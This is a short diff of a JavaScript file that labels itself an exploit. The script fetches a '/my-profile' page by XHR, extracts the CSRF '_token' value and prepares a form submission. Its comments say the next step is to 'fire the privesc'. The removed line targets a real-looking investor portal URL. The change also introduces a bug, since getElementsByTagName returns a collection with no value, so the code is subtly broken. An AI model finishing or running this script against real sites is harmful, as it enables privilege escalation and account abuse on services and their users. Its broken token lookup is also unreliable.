@@ -17,9 +17,8 @@ function getTokenJS() {
             // Get the input element
             console.log("extracting token value");
             console.log("this may be problematic if so, likely assigned the wrong input element...");
-            input = page.getElementById("_token");
+            input = page.getElementsByTagName("_token");
             // Show the token
-            console.log("aaaand:");
             console.log("The token is: " + input.value);
             // Use the token to submit the form
             //submitFormWithTokenJS(input.value);
@@ -29,7 +28,7 @@ function getTokenJS() {
     xhr.send(null);
 }
 console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
-var GET_URL="https://investorportal.ispt.net.au/my-profile";
+var GET_URL="/my-profile";
 getTokenJS();
 console.log("end of exploit");
 //EOF
